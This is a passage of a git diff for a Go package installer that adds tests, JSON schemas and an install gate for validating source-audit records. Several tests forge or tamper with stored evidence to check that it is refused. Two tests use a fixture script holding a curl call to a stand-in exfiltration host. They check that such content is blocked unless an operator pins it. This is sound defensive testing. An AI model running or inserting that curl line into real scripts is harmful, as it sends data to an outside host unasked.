++					if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++						t.Fatal(err)
++					}
++					doc["package"].(map[string]any)[field] = tc.value
++					forged, err := jsonMarshal(doc)
++					if err != nil {
++						t.Fatal(err)
++					}
++					object.EvidenceSHA256 = EvidenceDigest(forged)
++					expected.Evidence = forged
++					if err := ValidateSourceAudit(object, expected); err == nil ||
++						!strings.Contains(err.Error(), "source_audit") {
++						t.Fatalf("%s admitted: %v", label, err)
++					}
++				})
++			}
++		}
++	}
++	// Required members: missing, null, wrong type (object and report).
++	for _, arm := range arms {
++		for _, field := range arm.required {
++			t.Run("object-"+arm.name+"-missing-"+field, func(t *testing.T) {
++				object, _ := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++					t.Fatal(err)
++				}
++				delete(doc["package"].(map[string]any), field)
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if _, err := ParseSourceAudit(forged); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("missing %s admitted: %v", field, err)
++				}
++			})
++			t.Run("report-"+arm.name+"-missing-"+field, func(t *testing.T) {
++				object, expected := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++					t.Fatal(err)
++				}
++				delete(doc["package"].(map[string]any), field)
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				object.EvidenceSHA256 = EvidenceDigest(forged)
++				expected.Evidence = forged
++				if err := ValidateSourceAudit(object, expected); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("missing %s admitted: %v", field, err)
++				}
++			})
++			t.Run("object-"+arm.name+"-null-"+field, func(t *testing.T) {
++				object, _ := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)[field] = nil
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if _, err := ParseSourceAudit(forged); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("null %s admitted: %v", field, err)
++				}
++			})
++			t.Run("report-"+arm.name+"-null-"+field, func(t *testing.T) {
++				object, expected := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)[field] = nil
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				object.EvidenceSHA256 = EvidenceDigest(forged)
++				expected.Evidence = forged
++				if err := ValidateSourceAudit(object, expected); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("null %s admitted: %v", field, err)
++				}
++			})
++			wrong, ok := wrongType[field]
++			if !ok {
++				wrong = 123
++			}
++			t.Run("object-"+arm.name+"-wrongtype-"+field, func(t *testing.T) {
++				object, _ := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)[field] = wrong
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if _, err := ParseSourceAudit(forged); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("wrongtype %s admitted: %v", field, err)
++				}
++			})
++			t.Run("report-"+arm.name+"-wrongtype-"+field, func(t *testing.T) {
++				object, expected := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)[field] = wrong
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				object.EvidenceSHA256 = EvidenceDigest(forged)
++				expected.Evidence = forged
++				if err := ValidateSourceAudit(object, expected); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("wrongtype %s admitted: %v", field, err)
++				}
++			})
++		}
++	}
++	// Unknown members and trailing tokens (object and report).
++	for _, arm := range arms {
++		t.Run("object-"+arm.name+"-unknown", func(t *testing.T) {
++			object, _ := validBindingForPackage(t, arm.pkg())
++			var doc map[string]any
++			if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++				t.Fatal(err)
++			}
++			doc["package"].(map[string]any)["extra"] = "x"
++			forged, err := jsonMarshal(doc)
++			if err != nil {
++				t.Fatal(err)
++			}
++			if _, err := ParseSourceAudit(forged); err == nil ||
++				!strings.Contains(err.Error(), "source_audit") {
++				t.Fatalf("unknown member admitted: %v", err)
++			}
++		})
++		t.Run("report-"+arm.name+"-unknown", func(t *testing.T) {
++			object, expected := validBindingForPackage(t, arm.pkg())
++			var doc map[string]any
++			if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++				t.Fatal(err)
++			}
++			doc["package"].(map[string]any)["extra"] = "x"
++			forged, err := jsonMarshal(doc)
++			if err != nil {
++				t.Fatal(err)
++			}
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++			if err := ValidateSourceAudit(object, expected); err == nil ||
++				!strings.Contains(err.Error(), "source_audit") {
++				t.Fatalf("unknown member admitted: %v", err)
++			}
++		})
++		t.Run("object-"+arm.name+"-trailing", func(t *testing.T) {
++			object, _ := validBindingForPackage(t, arm.pkg())
++			raw := append(append([]byte(nil), objectBytes(t, object)...), []byte("{}")...)
++			if _, err := ParseSourceAudit(raw); err == nil ||
++				!strings.Contains(err.Error(), "source_audit") {
++				t.Fatalf("trailing admitted: %v", err)
++			}
++		})
++		t.Run("report-"+arm.name+"-trailing", func(t *testing.T) {
++			object, expected := validBindingForPackage(t, arm.pkg())
++			forged := append(append([]byte(nil), expected.Evidence...), []byte("{}")...)
++			object.EvidenceSHA256 = EvidenceDigest(forged)
++			expected.Evidence = forged
++			if err := ValidateSourceAudit(object, expected); err == nil ||
++				!strings.Contains(err.Error(), "source_audit") {
++				t.Fatalf("trailing admitted: %v", err)
++			}
++		})
++		// Commit closedness: extra member and null hex inside the Git arms.
++		if arm.name != "local-snapshot" {
++			t.Run("object-"+arm.name+"-commit-extra", func(t *testing.T) {
++				object, _ := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(objectBytes(t, object), &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)["commit"].(map[string]any)["extra"] = "x"
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if _, err := ParseSourceAudit(forged); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("commit extra admitted: %v", err)
++				}
++			})
++			t.Run("report-"+arm.name+"-commit-null-hex", func(t *testing.T) {
++				object, expected := validBindingForPackage(t, arm.pkg())
++				var doc map[string]any
++				if err := json.Unmarshal(expected.Evidence, &doc); err != nil {
++					t.Fatal(err)
++				}
++				doc["package"].(map[string]any)["commit"].(map[string]any)["hex"] = nil
++				forged, err := jsonMarshal(doc)
++				if err != nil {
++					t.Fatal(err)
++				}
++				object.EvidenceSHA256 = EvidenceDigest(forged)
++				expected.Evidence = forged
++				if err := ValidateSourceAudit(object, expected); err == nil ||
++					!strings.Contains(err.Error(), "source_audit") {
++					t.Fatalf("commit null hex admitted: %v", err)
++				}
++			})
++		}
++	}
++}
+diff --git a/internal/audit/testdata/draft-sources-v1/source-audit-v1.schema.json b/internal/audit/testdata/draft-sources-v1/source-audit-v1.schema.json
+new file mode 100644
+index 0000000..8dc444f
+--- /dev/null
++++ b/internal/audit/testdata/draft-sources-v1/source-audit-v1.schema.json
+@@ -0,0 +1,43 @@
++{
++  "$schema": "https://json-schema.org/draft/2020-12/schema",
++  "$id": "https://relux-works.github.io/curator-spec/schemas/draft-sources-v1/source-audit-v1.schema.json",
++  "type": "object",
++  "properties": {
++    "schema_version": {
++      "const": 1
++    },
++    "package": {
++      "$ref": "source-types-v1.schema.json#/$defs/package"
++    },
++    "content_sha256": {
++      "$ref": "../v1/common.schema.json#/$defs/sha256"
++    },
++    "decision": {
++      "enum": [
++        "allow",
++        "warn",
++        "block",
++        "require_pin"
++      ]
++    },
++    "policy_sha256": {
++      "$ref": "../v1/common.schema.json#/$defs/sha256"
++    },
++    "evidence_sha256": {
++      "$ref": "../v1/common.schema.json#/$defs/sha256"
++    },
++    "created_at": {
++      "$ref": "../v1/common.schema.json#/$defs/timestamp"
++    }
++  },
++  "required": [
++    "schema_version",
++    "package",
++    "content_sha256",
++    "decision",
++    "policy_sha256",
++    "evidence_sha256",
++    "created_at"
++  ],
++  "additionalProperties": false
++}
+diff --git a/internal/audit/testdata/draft-sources-v1/source-types-v1.schema.json b/internal/audit/testdata/draft-sources-v1/source-types-v1.schema.json
+new file mode 100644
+index 0000000..eb81ace
+--- /dev/null
++++ b/internal/audit/testdata/draft-sources-v1/source-types-v1.schema.json
+@@ -0,0 +1,136 @@
++{
++  "$schema": "https://json-schema.org/draft/2020-12/schema",
++  "$id": "https://relux-works.github.io/curator-spec/schemas/draft-sources-v1/source-types-v1.schema.json",
++  "$defs": {
++    "directory": {
++      "oneOf": [
++        {
++          "const": "."
++        },
++        {
++          "allOf": [
++            {
++              "$ref": "../v1/common.schema.json#/$defs/portablePath"
++            },
++            {
++              "not": {
++                "pattern": "(?:^|/)[^/]*[ .](?:/|$)|[*?\\[\\]]"
++              }
++            }
++          ]
++        }
++      ]
++    },
++    "repository": {
++      "type": "string",
++      "maxLength": 4096,
++      "pattern": "^[a-z0-9][a-z0-9.-]*/(?!.*(?:^|/)\\.{1,2}(?:/|$))[^\\s\\\\:%?#/]+(?:/[^\\s\\\\:%?#/]+)*$"
++    },
++    "package": {
++      "oneOf": [
++        {
++          "type": "object",
++          "properties": {
++            "kind": {
++              "const": "local-snapshot"
++            },
++            "snapshot": {
++              "$ref": "../v1/common.schema.json#/$defs/sha256"
++            }
++          },
++          "required": [
++            "kind",
++            "snapshot"
++          ],
++          "additionalProperties": false
++        },
++        {
++          "type": "object",
++          "properties": {
++            "kind": {
++              "const": "network-git"
++            },
++            "repository": {
++              "type": "string",
++              "maxLength": 4096,
++              "pattern": "^[a-z0-9][a-z0-9.-]*/(?!.*(?:^|/)\\.{1,2}(?:/|$))[^\\s\\\\:%?#/]+(?:/[^\\s\\\\:%?#/]+)*$"
++            },
++            "commit": {
++              "$ref": "../v1/common.schema.json#/$defs/lockedCommit"
++            },
++            "directory": {
++              "oneOf": [
++                {
++                  "const": "."
++                },
++                {
++                  "allOf": [
++                    {
++                      "$ref": "../v1/common.schema.json#/$defs/portablePath"
++                    },
++                    {
++                      "not": {
++                        "pattern": "(?:^|/)[^/]*[ .](?:/|$)|[*?\\[\\]]"
++                      }
++                    }
++                  ]
++                }
++              ]
++            }
++          },
++          "required": [
++            "kind",
++            "repository",
++            "commit",
++            "directory"
++          ],
++          "additionalProperties": false
++        },
++        {
++          "type": "object",
++          "required": [
++            "kind",
++            "source",
++            "commit",
++            "directory"
++          ],
++          "properties": {
++            "kind": {
++              "const": "configured-git"
++            },
++            "source": {
++              "$ref": "../v1/common.schema.json#/$defs/portablePath"
++            },
++            "commit": {
++              "$ref": "../v1/common.schema.json#/$defs/lockedCommit"
++            },
++            "directory": {
++              "const": "."
++            }
++          },
++          "additionalProperties": false
++        }
++      ]
++    },
++    "file": {
++      "type": "object",
++      "properties": {
++        "path": {
++          "$ref": "../v1/common.schema.json#/$defs/portablePath"
++        },
++        "sha256": {
++          "$ref": "../v1/common.schema.json#/$defs/sha256"
++        },
++        "executable": {
++          "type": "boolean"
++        }
++      },
++      "required": [
++        "path",
++        "sha256",
++        "executable"
++      ],
++      "additionalProperties": false
++    }
++  }
++}
+diff --git a/internal/install/draftaudit.go b/internal/install/draftaudit.go
+new file mode 100644
+index 0000000..3780283
+--- /dev/null
++++ b/internal/install/draftaudit.go
+@@ -0,0 +1,76 @@
++package install
++
++import (
++	"fmt"
++	"time"
++
++	"github.com/relux-works/curator/internal/artifactpolicy"
++	"github.com/relux-works/curator/internal/audit"
++	"github.com/relux-works/curator/internal/closure"
++	"github.com/relux-works/curator/internal/config"
++	"github.com/relux-works/curator/internal/registry"
++	"github.com/relux-works/curator/internal/scriptpolicy"
++	"github.com/relux-works/curator/internal/sourcelock"
++)
++
++// checkDraftSourceAudit binds draft members to the existing assurance gates
++// (skillfile-sources §4) before any cache or compiler work. It supplements
++// the shared audit gate, registry resolution, and build assurance preflight
++// that run later in the same order for every lane; nothing those gates
++// refused can pass here.
++//
++// Per member, in order:
++//
++//  1. registry: a local snapshot under a strict registry policy fails —
++//     local content has no network attestation identity and the registry
++//     never forges one (source-audit objects are not attestations);
++//  2. source audit: the machine-local source-audit-v1 binding is validated
++//     (or established on the mutating path) with the authorized pins,
++//     revocations, and effective script/assurance policy labels in force.
++//
++// The frozen v1 lane never reaches this function: it runs only for a
++// schema-2 lock consumed on the draft lane.
++func checkDraftSourceAudit(cfg *config.Config, nodes []*closure.Node, lock *sourcelock.Lock, dryRun bool, now time.Time) ([]string, error) {
++	scriptLabels := scriptpolicy.EffectiveLabels()
++	assuranceLabels := artifactpolicy.EffectiveLabels()
++	var warnings []string
++	for _, node := range nodes {
++		member, ok := lock.Find(node.Name)
++		if !ok {
++			return warnings, fmt.Errorf("source_member_missing: %s is not a locked member", node.Name)
++		}
++		if err := registry.CheckLocalPackage(node.Name, cfg.Audit.RegistryPolicy, member.Package.Kind); err != nil {
++			return warnings, err
++		}
++		subject := audit.SourceSubject{
++			Name: node.Name, Source: node.Decl.Source, Git: node.Decl.Git,
++			Commit: node.Resolved.Commit, Snapshot: node.Snapshot,
++			SchemaVersion: node.Spec.SchemaVersion, Capabilities: node.Spec.Capabilities,
++			Package: toSourceAuditPackage(member.Package), ContentSHA256: member.ContentSHA256,
++			ScriptLabels: scriptLabels, AssuranceLabels: assuranceLabels,
++		}
++		nodeWarnings, err := audit.CheckSourceAudit(cfg, subject, !dryRun, now)
++		warnings = append(warnings, nodeWarnings...)
++		if err != nil {
++			return warnings, err
++		}
++	}
++	return warnings, nil
++}
++
++// toSourceAuditPackage translates a locked package identity into the
++// source-audit arm. The translation is exact: the local arm carries no
++// commit, so its marshalled shape matches the source-types-v1 arms.
++func toSourceAuditPackage(pkg sourcelock.Package) audit.SourcePackage {
++	translated := audit.SourcePackage{
++		Kind:       pkg.Kind,
++		Snapshot:   pkg.Snapshot,
++		Repository: pkg.Repository,
++		Source:     pkg.Source,
++		Directory:  pkg.Directory,
++	}
++	if pkg.IsGit() {
++		translated.Commit = &audit.SourceCommit{ObjectFormat: pkg.Commit.ObjectFormat, Hex: pkg.Commit.Hex}
++	}
++	return translated
++}
+diff --git a/internal/install/draftaudit_test.go b/internal/install/draftaudit_test.go
+new file mode 100644
+index 0000000..63d4105
+--- /dev/null
++++ b/internal/install/draftaudit_test.go
+@@ -0,0 +1,1288 @@
++package install
++
++import (
++	"encoding/json"
++	"os"
++	"path/filepath"
++	"strings"
++	"testing"
++
++	"github.com/relux-works/curator/internal/audit"
++	"github.com/relux-works/curator/internal/config"
++	"github.com/relux-works/curator/internal/hashing"
++)
++
++// strictLocalProject resolves one local draft package and returns the
++// project, home, and frozen tree for production-entry gate checks.
++func strictLocalProject(t *testing.T, script string) (string, string, string) {
++	t.Helper()
++	payload := `{"schema_version":2,"sources":{"s":{"path":"."}},"skills":[{"from":"s","directory":"skills","include":["review"]}]}`
++	project, home, _ := draftProject(t, payload, map[string]string{"skills/review": "review"})
++	if script != "" {
++		dir := filepath.Join(project, "skills", "review", "scripts")
++		if err := os.MkdirAll(dir, 0o755); err != nil {
++			t.Fatal(err)
++		}
++		if err := os.WriteFile(filepath.Join(dir, "tool"), []byte(script), 0o644); err != nil {
++			t.Fatal(err)
++		}
++	}
++	plan := resolveDraftForInstall(t, project, home, payload)
++	return project, home, plan.Frozen["review"]
++}
++
++func draftAuditConfig(home string) *config.Config {
++	cfg := draftTestConfig(home, "")
++	cfg.Audit.Enabled = true
++	cfg.Audit.Mode = "strict"
++	cfg.Audit.FailOn = "high"
++	cfg.Audit.Backend = "null"
++	return cfg
++}
++
++func draftProjectResult(cfg *config.Config, project, _ string, dryRun bool) Result {
++	return Project(cfg, project, "test", Options{DryRun: dryRun, DraftSourcesV1: true, Platform: installPlatform()})
++}
++
++// A strict registry policy requires a network attestation that local
++// content cannot supply: the draft install fails before any cache or
++// compiler work instead of passing unattested.
++func TestDraftAuditStrictLocalRequiresAttestation(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftTestConfig(home, t.TempDir())
++	cfg.Audit.RegistryPolicy = "strict"
++	result := draftProjectResult(cfg, project, home, true)
++	if result.Status != "failed" ||
++		!strings.Contains(strings.Join(result.Errors, ";"), "no network attestation") {
++		t.Fatalf("strict local result = %+v, want network-attestation refusal", result)
++	}
++}
++
++// Narrowing the same fixture to advisory admits it: the refusal above is
++// the policy bound, not the package.
++func TestDraftAuditAdvisoryLocalPasses(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftTestConfig(home, t.TempDir())
++	result := draftProjectResult(cfg, project, home, true)
++	if result.Status != "ok" {
++		t.Fatalf("advisory local result = %+v, want ok", result)
++	}
++}
++
++// With audit enabled, a read-only plan without trust state fails
++// unavailable — missing evidence is unknown, never current — while the
++// mutating install establishes the binding through a live run before any
++// later phase. Draft marker publication (marker v5) is sibling scope, so
++// the install may still fail downstream at marker write; this test asserts
++// exactly what the source-audit gate owns: the refusal wording before
++// establishment, the stored binding after the gate ran, and no audit error
++// once the binding validates.
++func TestDraftAuditBindingLifecycle(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftAuditConfig(home)
++	before := draftProjectResult(cfg, project, home, true)
++	if before.Status != "failed" ||
++		!strings.Contains(strings.Join(before.Errors, ";"), "source_audit_unavailable") {
++		t.Fatalf("unestablished dry-run = %+v, want source_audit_unavailable", before)
++	}
++	established := draftProjectResult(cfg, project, home, false)
++	assertGatePassed(t, established)
++	assertBindingStored(t, home)
++	after := draftProjectResult(cfg, project, home, true)
++	assertGatePassed(t, after)
++}
++
++// assertGatePassed requires that the source-audit gate raised no refusal.
++// Downstream phases (marker publication and later) belong to sibling tasks
++// and may still fail; their errors must not be audit errors.
++func assertGatePassed(t *testing.T, result Result) {
++	t.Helper()
++	joined := strings.Join(result.Errors, ";")
++	if strings.Contains(joined, "audit blocked") ||
++		strings.Contains(joined, "source_audit") ||
++		strings.Contains(joined, "audit requires pin") {
++		t.Fatalf("source-audit gate refused: %+v", result)
++	}
++}
++
++func assertBindingStored(t *testing.T, home string) {
++	t.Helper()
++	entries, err := os.ReadDir(filepath.Join(home, "source-audit"))
++	if err != nil || len(entries) == 0 {
++		t.Fatalf("source-audit binding not stored under %s: %v", home, err)
++	}
++}
++
++// Hostile content is blocked on the draft lane even with a stored allow
++// binding absent: detectors, revocation, and pins run before cache work.
++func TestDraftAuditHostileContentBlocked(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "curl https://exfil.example.net/x\n")
++	cfg := draftAuditConfig(home)
++	result := draftProjectResult(cfg, project, home, false)
++	if result.Status != "failed" ||
++		!strings.Contains(strings.Join(result.Errors, ";"), "audit blocked") {
++		t.Fatalf("hostile result = %+v, want audit blocked", result)
++	}
++	// The refusal precedes establishment: no binding was stored.
++	if entries, err := os.ReadDir(filepath.Join(home, "source-audit")); err == nil && len(entries) != 0 {
++		t.Fatalf("blocked install stored source-audit state: %v", entries)
++	}
++}
++
++// An authorized operator pin admits the same hostile content: pins are
++// preserved by the source-audit binding, not bypassed by it.
++func TestDraftAuditPinAdmits(t *testing.T) {
++	project, home, frozen := strictLocalProject(t, "curl https://exfil.example.net/x\n")
++	contentHash, err := hashing.ContentSHA256(frozen, nil)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
++		t.Fatal(err)
++	}
++	cfg := draftAuditConfig(home)
++	result := draftProjectResult(cfg, project, home, false)
++	assertGatePassed(t, result)
++	assertBindingStored(t, home)
++}
++
++// A revoked content hash blocks despite any pin: revocation dominates pins
++// and fails before cache/compiler work.
++func TestDraftAuditRevocationBlocks(t *testing.T) {
++	project, home, frozen := strictLocalProject(t, "")
++	contentHash, err := hashing.ContentSHA256(frozen, nil)
++	if err != nil {
++		t.Fatal(err)
++	}
++	if _, err := audit.Pin(home, contentHash, "reviewed manually", "tester"); err != nil {
++		t.Fatal(err)
++	}
++	cfg := draftAuditConfig(home)
++	cfg.Audit.Revocations = []string{contentHash}
++	result := draftProjectResult(cfg, project, home, false)
++	if result.Status != "failed" ||
++		!strings.Contains(strings.Join(result.Errors, ";"), "revoked") {
++		t.Fatalf("revoked result = %+v, want revocation refusal", result)
++	}
++}
++
++// A missing, corrupt, or mismatching existing report refuses on the
++// production entry (install.Project) instead of being silently
++// re-established. First-time issuance (no binding at all) still establishes;
++// a broken existing record never overwrites. Covers review rev1 F1 and the
++// three overlay probe rows (missing-report, wrong-digest, forged-report).
++func TestDraftAuditBrokenReportRefuses(t *testing.T) {
++	for _, mode := range []string{"missing-report", "wrong-digest", "mismatching-report", "forged-report"} {
++		t.Run(mode, func(t *testing.T) {
++			project, home, _ := strictLocalProject(t, "")
++			cfg := draftAuditConfig(home)
++			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++			objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
++			if err != nil {
++				t.Fatal(err)
++			}
++			var objectPath, reportPath string
++			for _, p := range objects {
++				if strings.HasSuffix(p, ".report.json") {
++					reportPath = p
++				} else {
++					objectPath = p
++				}
++			}
++			if objectPath == "" || reportPath == "" {
++				t.Fatal("binding missing")
++			}
++			objectBefore, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			dryRun := false
++			switch mode {
++			case "missing-report":
++				if err := os.Remove(reportPath); err != nil {
++					t.Fatal(err)
++				}
++			case "wrong-digest":
++				if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "mismatching-report":
++				raw, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(reportPath, append(append([]byte(nil), raw...), ' '), 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "forged-report":
++				raw, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var report map[string]any
++				if err := json.Unmarshal(raw, &report); err != nil {
++					t.Fatal(err)
++				}
++				delete(report, "findings")
++				delete(report, "pinned")
++				delete(report, "revoked")
++				delete(report, "script_policy")
++				delete(report, "assurance_policy")
++				delete(report, "schema_version")
++				report["skill"] = "different-skill"
++				forged, err := json.Marshal(report)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++					t.Fatal(err)
++				}
++				raw, err = os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var object map[string]any
++				if err := json.Unmarshal(raw, &object); err != nil {
++					t.Fatal(err)
++				}
++				object["evidence_sha256"] = audit.EvidenceDigest(forged)
++				raw, err = json.Marshal(object)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
++					t.Fatal(err)
++				}
++				objectBefore = raw
++				dryRun = true
++			}
++			// The broken existing record refuses on its own path.
++			result := draftProjectResult(cfg, project, home, dryRun)
++			if !strings.Contains(strings.Join(result.Errors, ";"), "source_audit") {
++				t.Fatalf("%s evidence was NOT refused by source audit: %+v", mode, result)
++			}
++			// Narrowing: the opposite path refuses too — a broken record
++			// never heals by switching dry-run.
++			other := draftProjectResult(cfg, project, home, !dryRun)
++			if !strings.Contains(strings.Join(other.Errors, ";"), "source_audit") {
++				t.Fatalf("%s evidence was NOT refused on the opposite path: %+v", mode, other)
++			}
++			// Never overwritten: the object bytes are intact for the
++			// non-forged modes, and no fresh binding heals the breakage.
++			if mode != "forged-report" {
++				after, err := os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(objectBefore) != string(after) {
++					t.Fatalf("%s existing binding was overwritten", mode)
++				}
++			}
++		})
++	}
++}
++
++// Narrowing the broken-report refusal: deleting the whole binding (object
++// and report) returns to first-time issuance and re-establishes, while
++// deleting only the report refuses. This proves the bound is the existing
++// record, not the package.
++func TestDraftAuditFirstIssuanceVsBrokenRecord(t *testing.T) {
++	project, home, _ := strictLocalProject(t, "")
++	cfg := draftAuditConfig(home)
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++	objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
++	if err != nil {
++		t.Fatal(err)
++	}
++	var objectPath, reportPath string
++	for _, p := range objects {
++		if strings.HasSuffix(p, ".report.json") {
++			reportPath = p
++		} else {
++			objectPath = p
++		}
++	}
++	if objectPath == "" || reportPath == "" {
++		t.Fatal("binding missing")
++	}
++	// Broken: report gone, object present → refuses on mutating path.
++	if err := os.Remove(reportPath); err != nil {
++		t.Fatal(err)
++	}
++	broken := draftProjectResult(cfg, project, home, false)
++	if !strings.Contains(strings.Join(broken.Errors, ";"), "source_audit") {
++		t.Fatalf("broken record was NOT refused: %+v", broken)
++	}
++	// First issuance: no object and no report → mutating re-establishes
++	// through a fresh live run.
++	if err := os.Remove(objectPath); err != nil {
++		t.Fatal(err)
++	}
++	assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++	assertBindingStored(t, home)
++}
++
++// A corrupt, forged, or time/decision-invalid existing record combined with
++// a trusted policy drift still refuses instead of renewing: evidence
++// integrity, completeness, trusted bindings, time, and decision are all
++// validated before the renewable policy check, so a renewable error never
++// hides another refusal. A valid record under the same drift renews through
++// a fresh live run. Covers review rev2 F1.
++func TestDraftAuditPolicyRenewalBrokenEvidence(t *testing.T) {
++	for _, mode := range []string{"corrupt", "wrong-skill", "future-time", "decision-drift", "genuine-renewal"} {
++		t.Run(mode, func(t *testing.T) {
++			project, home, _ := strictLocalProject(t, "")
++			cfg := draftAuditConfig(home)
++			assertGatePassed(t, draftProjectResult(cfg, project, home, false))
++			objects, err := filepath.Glob(filepath.Join(home, "source-audit", "*.json"))
++			if err != nil {
++				t.Fatal(err)
++			}
++			var objectPath, reportPath string
++			for _, p := range objects {
++				if strings.HasSuffix(p, ".report.json") {
++					reportPath = p
++				} else {
++					objectPath = p
++				}
++			}
++			if objectPath == "" || reportPath == "" {
++				t.Fatal("binding missing")
++			}
++			objectBeforeRenewal, err := os.ReadFile(objectPath)
++			if err != nil {
++				t.Fatal(err)
++			}
++			switch mode {
++			case "corrupt":
++				if err := os.WriteFile(reportPath, []byte(`{}`), 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "wrong-skill":
++				raw, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var report audit.EvidenceReport
++				if err := json.Unmarshal(raw, &report); err != nil {
++					t.Fatal(err)
++				}
++				report.Skill = "different-skill"
++				forged, err := audit.MarshalEvidenceReport(report)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++					t.Fatal(err)
++				}
++				raw, err = os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var object map[string]any
++				if err := json.Unmarshal(raw, &object); err != nil {
++					t.Fatal(err)
++				}
++				object["evidence_sha256"] = audit.EvidenceDigest(forged)
++				raw, err = json.Marshal(object)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "future-time":
++				raw, err := os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var object map[string]any
++				if err := json.Unmarshal(raw, &object); err != nil {
++					t.Fatal(err)
++				}
++				object["created_at"] = "2030-01-01T00:00:00Z"
++				raw, err = json.Marshal(object)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "decision-drift":
++				raw, err := os.ReadFile(reportPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var report audit.EvidenceReport
++				if err := json.Unmarshal(raw, &report); err != nil {
++					t.Fatal(err)
++				}
++				report.Decision = audit.DecisionWarn
++				forged, err := audit.MarshalEvidenceReport(report)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(reportPath, forged, 0o600); err != nil {
++					t.Fatal(err)
++				}
++				raw, err = os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				var object map[string]any
++				if err := json.Unmarshal(raw, &object); err != nil {
++					t.Fatal(err)
++				}
++				object["decision"] = audit.DecisionWarn
++				object["evidence_sha256"] = audit.EvidenceDigest(forged)
++				raw, err = json.Marshal(object)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if err := os.WriteFile(objectPath, raw, 0o600); err != nil {
++					t.Fatal(err)
++				}
++			case "genuine-renewal":
++				// No tampering: the stored evidence stays valid.
++			}
++			// Trusted policy drift: FailOn high -> critical changes the
++			// policy digest without changing the clean live verdict.
++			cfg.Audit.FailOn = "critical"
++			if mode == "genuine-renewal" {
++				result := draftProjectResult(cfg, project, home, false)
++				assertGatePassed(t, result)
++				renewed, err := os.ReadFile(objectPath)
++				if err != nil {
++					t.Fatal(err)
++				}
++				if string(renewed) == string(objectBeforeRenewal) {
